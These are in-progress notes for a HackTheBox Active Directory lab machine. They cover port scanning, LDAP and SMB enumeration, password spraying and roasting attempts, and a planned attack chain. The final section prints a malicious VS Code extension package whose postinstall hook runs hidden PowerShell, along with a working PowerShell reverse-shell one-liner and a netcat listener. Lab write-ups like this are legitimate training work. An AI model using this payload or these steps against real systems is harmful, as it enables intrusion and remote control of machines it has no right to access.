# HackTheBox — Checkpoint (Active Machine)

> **Status:** In Progress  
> **OS:** Windows (Server 2025 / Windows 11 Build 26100)  
> **Difficulty:** Medium (estimated)  
> **Domain:** checkpoint.htb  
> **DC Hostname:** DC01 (`dc01.checkpoint.htb`)  
> **Target IP:** `10.129.171.185`
> **Make sure before get user flag we need to store it first. bloodyAD --host <DC_IP> -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore mark.davies**
---

## Table of Contents

- [Environment Setup](#environment-setup)
- [Reconnaissance](#reconnaissance)
- [Active Directory Enumeration](#active-directory-enumeration)
- [Credentials Discovered](#credentials-discovered)
- [Share Enumeration](#share-enumeration)
- [ACL Analysis](#acl-analysis)
- [Attack Path Analysis](#attack-path-analysis)
- [Tools Used](#tools-used)
- [Findings Summary](#findings-summary)

---

## Environment Setup

### Hosts File
```
10.129.171.185  checkpoint.htb dc01.checkpoint.htb
```

### Clock Sync (Required — 7hr skew)
```bash
sudo ntpdate 10.129.171.185
```

---

## Reconnaissance

### Nmap — Full Port Scan
```bash
nmap -p- --min-rate 5000 10.129.171.185 -oN init.nmap
nmap -sV -sC -p- --reason 10.129.171.185 --min-rate 5000 -vvv
```

### Open Ports

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 53 | TCP | DNS | Simple DNS Plus |
| 88 | TCP | Kerberos | AD Kerberos v5 |
| 135 | TCP | MSRPC | Windows RPC |
| 139 | TCP | NetBIOS | SMB helper |
| 389 | TCP | LDAP | AD LDAP (signing enforced) |
| 445 | TCP | SMB | Signing required |
| 464 | TCP | kpasswd | Kerberos password change |
| 593 | TCP | RPC/HTTP | RPC over HTTP 1.0 |
| 636 | TCP | LDAPS | LDAP over SSL (resets conn) |
| 3268 | TCP | GC LDAP | Global Catalog |
| 3269 | TCP | GC LDAPS | Global Catalog SSL |
| 5985 | TCP | WinRM | Windows Remote Management |
| 9389 | TCP | mc-nmf | .NET Message Framing |
| 49664–49716 | TCP | MSRPC | Dynamic RPC endpoints |

### Key Observations
- SMB signing **enforced** — rules out NTLM relay attacks
- LDAP signing **enforced** — anonymous bind denied, LDAPS connection resets
- WinRM open — potential shell if credentials found
- No web services (HTTP/HTTPS) — pure AD/Windows attack surface

---

## Active Directory Enumeration

### SYSVOL Access (Unauthenticated)
```bash
smbclient //10.129.171.185/SYSVOL \
  -U 'checkpoint.htb/alex.turner%Checkpoint2024!' \
  -c 'recurse ON; prompt OFF; mget *'
```

**Files Retrieved:**
- `{31B2F340...}/MACHINE/Registry.pol` — Contains EFS certificate for Administrator
- `{6AC1786C...}/GPT.INI` — Version=4
- `{6AC1786C...}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf` — Security policy

**Registry.pol Notable Content:**
- EFS File Encryption Certificate issued to `Administrator@CHECKPOINT`
- Certificate validity: `260509` to `21260415` (100 year cert — suspicious)

### User Enumeration (Authenticated LDAP)
```bash
netexec ldap 10.129.171.185 -u 'alex.turner' -p 'Checkpoint2024!' --users
impacket-GetADUsers -all checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.171.185
```

### Domain Users

| Username | OU | Last Logon | Bad PWD | Notes |
|----------|----|------------|---------|-------|
| Administrator | CN=Users | 2026-05-26 | 1 | Built-in |
| Guest | CN=Users | Never | 1 | Disabled |
| krbtgt | CN=Users | Never | 1 | KDC account |
| alex.turner | Employees | Never | 1 | **PROVIDED CREDS** |
| ryan.brooks | Employees | 2026-06-15 | 2 | Active, DevTeam |
| svc_deploy | ServiceAccounts | Never | **90** | Deployment SA |
| james.harper | IT/Employees | Never | 0 | IT-Staff |
| sarah.mitchell | IT/Employees | Never | 0 | IT-Staff |
| emily.carter | Finance/Employees | Never | 0 | |
| david.reynolds | Finance/Employees | Never | 0 | |
| jessica.coleman | HR/Employees | Never | 0 | |
| lauren.flores | HR/Employees | Never | 0 | |
| michael.torres | Engineering/Employees | Never | 0 | DevTeam |
| kevin.patterson | Engineering/Employees | Never | 0 | |
| brian.jenkins | Engineering/Employees | Never | 0 | DevTeam |
| megan.perry | Engineering/Employees | Never | 0 | |
| max.palmer | CN=Users | **2026-06-15** | 86 | **Domain Admin!** |

### Group Memberships

| Group | Members | Notes |
|-------|---------|-------|
| Domain Admins | Administrator, max.palmer | max.palmer added May 26 |
| IT-Staff | alex.turner, james.harper, sarah.mitchell | |
| DevTeam | ryan.brooks, michael.torres, brian.jenkins | Likely DevDrop write access |
| VPN-Users | alex.turner, ryan.brooks, james.harper, michael.torres | |
| BackupAccess | svc_deploy | Only member |
| Remote Management Users | svc_deploy | WinRM access if creds found |
| Engineering-Staff | michael.torres, kevin.patterson, brian.jenkins, megan.perry | |
| Finance-Staff | emily.carter, david.reynolds | |
| HR-Staff | jessica.coleman, lauren.flores | |

### Password Policy
```bash
netexec ldap 10.129.171.185 -u 'alex.turner' -p 'Checkpoint2024!' --pass-pol
```
- Minimum length: 7
- Complexity: Enabled
- **Lockout threshold: 0 (NO LOCKOUT)** — safe to spray
- Lockout duration: 10 minutes
- History: 24 passwords

### AS-REP Roasting Result
```bash
impacket-GetNPUsers checkpoint.htb/ -usersfile users.txt -no-pass -dc-ip 10.129.171.185
```
- **No users with DONT_REQUIRE_PREAUTH** — confirmed via LDAP UAC bit filter
- `KDC_ERR_ETYPE_NOSUPP` = Guest account
- `KDC_ERR_CLIENT_REVOKED` = krbtgt

### Kerberoasting Result
```bash
impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.171.185 -request
```
- **No entries found** — no service accounts with SPNs

---

## Credentials Discovered

| Username | Password | Source | WinRM | Notes |
|----------|----------|--------|-------|-------|
| alex.turner | Checkpoint2024! | Provided | No | IT-Staff |
| michael.torres | Summer2024! | Password spray | No | DevTeam, no DevDrop write |
| james.harper | Summer2024! | Password spray | No | IT-Staff |
| sarah.mitchell | Summer2024! | Password spray | No | IT-Staff |
| ryan.brooks | **Unknown** | Rockyou: no hit | — | **Has WriteProperties on svc_deploy** |
| svc_deploy | **Unknown** | Not found | — | **BackupAccess + Remote Mgmt** |
| max.palmer | **Unknown** | Not found | — | **Domain Admin** |

### Password Spray Commands
```bash
# Test single password against all users
netexec ldap 10.129.171.185 -u users.txt -p 'Summer2024!'

# Test single user against wordlist
netexec ldap 10.129.171.185 -u 'ryan.brooks' -p /usr/share/wordlists/rockyou.txt 2>/dev/null | grep '\[+\]'
```

---

## Share Enumeration

### Shares Visible (alex.turner)
```bash
netexec smb 10.129.171.185 -u 'alex.turner' -p 'Checkpoint2024!' --shares
```

| Share | Permissions | Description |
|-------|-------------|-------------|
| ADMIN$ | None | Remote Admin |
| C$ | None | Default share |
| **DevDrop** | READ (alex) | VS Code extensions — .vsix packages for engine 1.118.0 |
| IPC$ | READ | Remote IPC |
| NETLOGON | READ | Logon server share |
| SYSVOL | READ | Logon server share |
| VMBackups | None | Access denied |

### DevDrop Share — Key Target
```bash
smbclient //10.129.171.185/DevDrop -U 'checkpoint.htb/alex.turner%Checkpoint2024!'
```
- **Currently empty**
- Backend automation watches for new `.vsix` files
- Installs them via Node.js npm lifecycle hooks
- `postinstall` in `package.json` triggers on extraction
- **Write access needed** to deploy malicious extension

### Write Test Results
| Account | DevDrop Write | Notes |
|---------|--------------|-------|
| alex.turner | DENIED | READ only |
| michael.torres | DENIED | No permissions shown |
| james.harper | DENIED | No permissions shown |
| sarah.mitchell | DENIED | No permissions shown |

---

## ACL Analysis

### Notable ACE: ryan.brooks → svc_deploy
```
Target: svc_deploy
Trustee: ryan.brooks
Access mask: ReadControl, WriteProperties, Self (0x20028)
```
**Meaning:** ryan.brooks can modify properties of svc_deploy (potentially reset password)

### Attack Chain (Planned)
```
ryan.brooks (WriteProperties) → svc_deploy (password reset)
    ↓
svc_deploy (Remote Management Users) → WinRM shell
    ↓
svc_deploy (BackupAccess) → DevDrop WRITE (assumed)
    ↓
Upload malicious .vsix → postinstall reverse shell
    ↓
Initial foothold as service account
    ↓
Privilege escalation → max.palmer (Domain Admin)
```

### DACL Query Commands
```bash
# Read ACLs on a target filtered by principal
netexec ldap 10.129.171.185 \
  -u 'alex.turner' -p 'Checkpoint2024!' \
  -M daclread \
  -o TARGET=svc_deploy ACTION=read PRINCIPAL=ryan.brooks
```

---

## Attack Path Analysis

### Malicious .vsix Structure
A `.vsix` file is a ZIP archive. The backend extracts and runs `npm install`, triggering `postinstall`:

```json
{
  "name": "dev-tools-helper",
  "displayName": "Dev Tools Helper",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "scripts": {
    "postinstall": "powershell -nop -w hidden -e <BASE64_REVERSE_SHELL>"
  },
  "main": "./extension/index.js"
}
```

### Generate Reverse Shell Payload
```bash
YOUR_IP="10.10.14.X"
PAYLOAD='$c=New-Object Net.Sockets.TCPClient("IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)}'
B64=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w 0)
```

### Build and Deploy
```bash
mkdir -p /tmp/evil-vsix/extension
cd /tmp/evil-vsix
# Create package.json with postinstall payload
echo 'exports.activate = function() {}' > extension/index.js
zip -r ../evil-tools.vsix .
nc -lvnp 4444 &
smbclient //10.129.171.185/DevDrop \
  -U 'checkpoint.htb/WRITEACCOUNT%PASSWORD' \
  -c 'put /tmp/evil-tools.vsix evil-tools.vsix'
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning, service detection |
| `netexec` (nxc) | SMB/LDAP/WinRM enumeration and spraying |
| `smbclient` | Share browsing and file transfer |
| `impacket-GetNPUsers` | AS-REP roasting |
| `impacket-GetUserSPNs` | Kerberoasting |
| `impacket-GetADUsers` | User enumeration via LDAP |
| `impacket` (python3) | Direct LDAP queries with signing support |
| `hashcat` | Password hash cracking |
| `bloodhound-python` | AD attack path mapping (blocked by LDAPS) |
| `ntpdate` | Clock sync for Kerberos |

---

## Findings Summary

### What We Know
- Pure AD/Windows environment, no web attack surface
- SMB + LDAP signing enforced — no relay attacks
- No AS-REP roastable or Kerberoastable accounts
- DevDrop share is the intended attack vector (.vsix execution)
- max.palmer is a Domain Admin created suspiciously late (May 26)

### What We Still Need
- [ ] svc_deploy password (or ryan.brooks → WriteProperties abuse)
- [ ] DevDrop WRITE access
- [ ] Initial shell via malicious .vsix
- [ ] Privilege escalation path to Domain Admin

### Blocked/Dead Ends
- BloodHound — LDAPS connection reset, LDAP signing blocks NTLM
- AS-REP roasting — no vulnerable accounts
- Kerberoasting — no SPNs
- Anonymous/guest SMB/LDAP — access denied
- rockyou against ryan.brooks — no match found

---

*Notes compiled during active enumeration — Checkpoint HTB, June 2026*
